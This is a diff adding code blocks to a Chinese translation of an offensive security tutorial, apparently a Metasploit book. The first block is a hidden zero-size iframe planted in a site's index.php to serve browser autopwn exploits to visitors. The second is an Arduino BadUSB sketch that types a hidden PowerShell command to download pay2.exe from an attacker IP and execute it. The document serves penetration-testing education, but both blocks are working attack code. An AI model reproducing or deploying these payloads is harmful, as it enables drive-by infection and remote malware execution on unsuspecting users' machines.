@@ -90,7 +90,9 @@ autopwn 指的是对目标的自动利用。autopwn 模块通过自动配置它�
 
 我们有一个示例网站，存在一个允许我们上传基于 PHP 的第三方 Web shell 的 Web 应用程序漏洞。要执行攻击，我们需要将以下行添加到`index.php`页面，或者我们选择的任何其他页面：
 
-[PRE0]
+```
+<iframe src="img/" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe> 
+```
 
 上述代码行将在受害者访问网站时在 iFrame 中加载恶意的浏览器 autopwn。由于这段代码在一个`iframe`标签中，它将自动从攻击者的系统中包含浏览器 autopwn。我们需要保存这个文件并允许访问者查看网站并浏览它。
 
@@ -240,7 +242,35 @@ autopwn 指的是对目标的自动利用。autopwn 模块通过自动配置它�
 
 让我们看看我们需要在 Arduino 芯片上烧录的代码：
 
-[PRE1]
+```
+#include<Keyboard.h>
+void setup() {
+delay(2000);
+type(KEY_LEFT_GUI,false);
+type('d',false);
+Keyboard.releaseAll();
+delay(500);
+type(KEY_LEFT_GUI,false);
+type('r',false);
+delay(500);
+Keyboard.releaseAll();
+delay(1000);
+print(F("powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.10.107/pay2.exe','%TEMP%\\mal.exe'); Start-Process \"%TEMP%\\mal.exe\""));
+delay(1000);
+type(KEY_RETURN,false);
+Keyboard.releaseAll();
+Keyboard.end();
+}
+void type(int key, boolean release) {
+ Keyboard.press(key);
+ if(release)
+  Keyboard.release(key);
+}
+void print(const __FlashStringHelper *value) {
+ Keyboard.print(value);
+}
+void loop(){}
+```
 
 我们有一个名为`type`的函数，它接受两个参数，即要按下和释放的键的名称，这决定了我们是否需要释放特定的键。下一个函数是`print`，它通过直接在键盘按下函数上输出文本来覆盖默认的`print`函数。Arduino 主要有两个函数，即`loop`和`setup`。由于我们只需要我们的 payload 下载和执行一次，所以我们将代码放在`setup`函数中。当我们需要重复一组指令时，需要`Loop`函数。`delay`函数相当于`sleep`函数，它暂停程序一定的毫秒数。`type(KEY_LEFT_GUI, false);`将按下目标上的左 Windows 键，由于我们需要保持按下，所以我们将`false`作为释放参数传递。接下来，以同样的方式，我们传递`d`键。现在，我们按下了两个键，即 Windows + *D*（显示桌面的快捷键）。一旦我们提供`Keyboard.releaseAll();`，`Windows+d`命令就会被推送到目标上执行，这将最小化桌面上的所有内容。
 
